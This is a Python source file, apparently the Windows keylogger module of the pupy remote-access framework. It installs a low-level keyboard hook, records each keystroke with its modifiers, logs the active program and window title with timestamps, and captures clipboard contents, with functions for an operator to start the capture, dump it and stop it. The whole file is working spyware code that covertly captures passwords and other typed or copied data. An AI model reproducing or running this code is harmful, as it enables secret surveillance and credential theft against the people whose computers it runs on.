# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

import datetime
import string

from hookfuncs import (
    GetKeyState, HOOKPROC, SetTimer, MSG, byref,
    GetMessageW, KillTimer, GetModuleHandleW, SetWindowsHookEx,
    WH_KEYBOARD_LL, WinError, UnhookWindowsHookEx,
    CallNextHookEx, LOWORD, WM_KEYUP, WM_SYSKEYUP,
    BYTE, WCHAR, KBDLLHOOKSTRUCT, DWORD, GetWindowThreadProcessId,
    GetForegroundWindow, GetKeyboardLayout, GetKeyboardState,
    VK_MENU, VK_CONTROL, VK_LWIN, VK_RWIN, VK_SHIFT, VK_LSHIFT, VK_RMENU,
    ToUnicodeEx, ToAsciiEx, get_current_process, get_clipboard
)

import pupy

UNPRINTABLE = {
    0x09: 'TAB',
    0x0D: 'RET',
    0x1B: 'ESC',
    0x08: 'BKSC',
    0x21: 'PGUP',
    0x22: 'PGDN',
    0x23: 'END',
    0x24: 'HOME',
    0x25: 'LFT',
    0x26: 'UP',
    0x27: 'RGHT',
    0x28: 'DWN',
    0x2D: 'INS',
    0x2E: 'DEL',
    0x5B: 'LWIN',
    0x5C: 'RWIN',
    0x5D: 'APPS',
    0x70: 'F1',
    0x71: 'F2',
    0x72: 'F3',
    0x73: 'F4',
    0x74: 'F5',
    0x75: 'F6',
    0x76: 'F7',
    0x77: 'F8',
    0x78: 'F9',
    0x79: 'F10',
    0x7A: 'F11',
    0x7B: 'F12'
}

#some windows function defines :

def keylogger_start(event_id=None):
    if pupy.manager.active(KeyLogger):
        return False

    try:
        pupy.manager.create(KeyLogger, event_id=event_id)
    except:
        return False

    return True

def keylogger_dump():
    keylogger = pupy.manager.get(KeyLogger)
    if keylogger:
        return keylogger.results

def keylogger_stop():
    keylogger = pupy.manager.get(KeyLogger)
    if keylogger:
        pupy.manager.stop(KeyLogger)
        return keylogger.results

def is_pressed(*keys):
    return any(
        GetKeyState(x) & 0x8000 for x in keys
    )

class KeyLogger(pupy.Task):
    results_type = unicode

    def __init__(self, *args, **kwargs):
        super(KeyLogger, self).__init__(*args, **kwargs)
        self.hooked = None
        self.last_windows = None
        self.last_clipboard = ''
        self.hook_proc_ptr = HOOKPROC(self.hook_proc)

    def append(self, k):
        if type(k) == unicode:
            super(KeyLogger, self).append(k)
        else:
            super(KeyLogger, self).append(k.decode('utf-8'))

    def task(self):
        if self.hooked:
            raise ValueError('Task already active')

        try:
            self.install_hook()
        except:
            self.stop()
            return

        timer = None

        try:
            timer = SetTimer(0, 0, 1000, 0)

            msg = MSG()
            msgptr = byref(msg)

            while self.active:
                try:
                    GetMessageW(msgptr, None, 0, 0)
                except Exception, e:
                    raise ValueError('Shit: {} / {} / {} / {}'.format(msg, msgptr, GetMessageW, e))

        finally:
            if timer:
                KillTimer(0, timer)

            self.uninstall_hook()

    def install_hook(self):
        if self.hooked:
            raise ValueError('Task already active')

        modhwd = GetModuleHandleW(None)

        self.hooked = SetWindowsHookEx(
            WH_KEYBOARD_LL, self.hook_proc_ptr, modhwd, 0)

        if not self.hooked:
            raise WinError()

    def uninstall_hook(self):
        if self.hooked is None:
            return

        try:
            if not UnhookWindowsHookEx(self.hooked):
                raise WinError()

        finally:
            self.hooked = None

    def hook_proc(self, nCode, wParam, lParam):
        try:
            self._hook_proc(nCode, wParam, lParam)
        except:
            import traceback
            traceback.print_exc()
            raise

        finally:
            return CallNextHookEx(self.hooked, nCode, wParam, lParam)

    def _hook_proc(self, nCode, wParam, lParam):
        # The keylogger callback
        if LOWORD(wParam) not in (WM_KEYUP, WM_SYSKEYUP):
            return

        keyState = (BYTE * 256)()
        buff = (WCHAR * 256)()
        kbdllhookstruct = KBDLLHOOKSTRUCT.from_address(lParam)

        key = ''
        modifiers = []

        pid = DWORD()
        tid = GetWindowThreadProcessId(GetForegroundWindow(), byref(pid))
        hKl = GetKeyboardLayout(tid)

        if not GetKeyboardState(byref(keyState)):
            return

        if is_pressed(VK_MENU):
            keyState[VK_MENU] = 0x80
            modifiers.append('ALT')

        if is_pressed(VK_CONTROL):
            keyState[VK_MENU] = 0x80
            modifiers.append('CTRL')

        if is_pressed(VK_LWIN, VK_RWIN):
            modifiers.append('WIN')

        if is_pressed(VK_SHIFT):
            keyState[VK_SHIFT] = 0x80
            if modifiers:
                modifiers.append('SHIFT')

        if kbdllhookstruct.vkCode in UNPRINTABLE:
            if not (kbdllhookstruct.vkCode in (VK_LWIN, VK_RWIN) and 'WIN' in modifiers):
                key = UNPRINTABLE[kbdllhookstruct.vkCode]
                if not modifiers:
                    key = '[' + key + ']'

        elif kbdllhookstruct.vkCode >= VK_LSHIFT and kbdllhookstruct.vkCode <= VK_RMENU:
            key = ''

        else:
            #https://msdn.microsoft.com/en-us/library/windows/desktop/ms646322(v=vs.85).aspx
            r = ToUnicodeEx(
                kbdllhookstruct.vkCode,
                kbdllhookstruct.scanCode,
                byref(keyState),
                byref(buff),
                256,
                0,
                hKl
            )

            if r == 0:
                r = ToAsciiEx(
                    kbdllhookstruct.vkCode,
                    kbdllhookstruct.scanCode,
                    byref(keyState),
                    byref(buff),
                    0,
                    0
                )

            if r == 0: #nothing written to the buffer
                key = chr(kbdllhookstruct.vkCode)
                if key not in string.printable:
                    key = '{:02X}'.format(
                        kbdllhookstruct.vkCode)

            else:
                key = buff.value

        if modifiers and key:
            hooked_key = '{' + ('+'.join(modifiers)) + '+' + key + '}'
        else:
            hooked_key = key

        exe, win_title = 'unknown', 'unknown'
        try:
            exe, win_title = get_current_process()
        except Exception:
            pass

        if self.last_windows!=(exe, win_title):
            self.append(
                u'\n{}: {} {}\n'.format(
                    datetime.datetime.now(),
                    exe, win_title))
            self.last_windows=(exe, win_title)

        paste=''

        try:
            paste = get_clipboard()
        except Exception:
            pass

        if paste and paste != self.last_clipboard:
            try:
                self.append(u'\n<clipboard>{}</clipboard>\n'.format(paste.strip()))
            except:
                self.append(u'\n<clipboard>{}</clipboard>\n'.format(repr(paste)[2:-1]))

            self.last_clipboard = paste

        if hooked_key:
            self.append(hooked_key)
